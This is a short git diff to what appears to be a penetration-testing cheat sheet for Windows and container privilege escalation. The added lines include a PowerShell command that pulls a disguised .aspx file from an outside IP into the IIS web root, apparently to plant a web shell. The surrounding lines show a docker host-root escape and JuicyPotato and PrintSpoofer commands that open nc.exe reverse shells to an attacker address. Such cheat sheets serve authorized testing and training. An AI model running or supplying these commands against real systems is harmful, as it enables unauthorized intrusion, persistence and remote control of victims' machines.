@@ -322,6 +322,12 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # Lists user privileges
 whoami /priv
 
+# Lists user groups
+whoami /groups
+
+# Quick PowerShell upload transgfer
+powershell iwr 10.10.16.52/nothinghere.aspx -outfile "C:\inetpub\wwwroot\nothinghere.aspx"
+
 # SeImpersonate and SeAssignPrimaryToken
 c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd.exe" -t *
 c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd"
